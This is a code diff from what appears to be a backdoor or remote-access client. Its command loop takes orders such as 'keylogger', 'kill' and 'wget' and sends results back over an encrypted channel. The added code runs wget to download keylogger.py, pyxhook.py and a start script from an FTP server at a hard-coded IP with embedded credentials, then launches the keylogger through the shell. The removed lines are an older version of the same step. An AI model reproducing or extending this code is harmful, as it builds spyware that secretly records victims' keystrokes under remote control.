@@ -59,11 +59,12 @@ def main():
             results = results.stdout.read() + results.stderr.read()
             
         elif cmd == 'keylogger':
-            action = 'wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py'
-            results = subprocess.Popen(action, shell=True,
-                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                      stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
+            action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'source start_keylogger.sh']
+            for i in range(len(action)):
+                results = subprocess.Popen(action[i], shell=True,
+                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                          stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
 
         elif cmd == 'kill':
             conn.close()
@@ -96,10 +97,6 @@ def main():
         elif cmd == 'wget':
             results = toolkit.wget(action)
         
-        elif cmd == 'keylogger':
-            subprocess.Popen('wget','ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py')
-            subprocess.Popen('wget','ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py')
-            subprocess.Popen(python,keylogger.py)
 
         client.sendGCM(results)
 
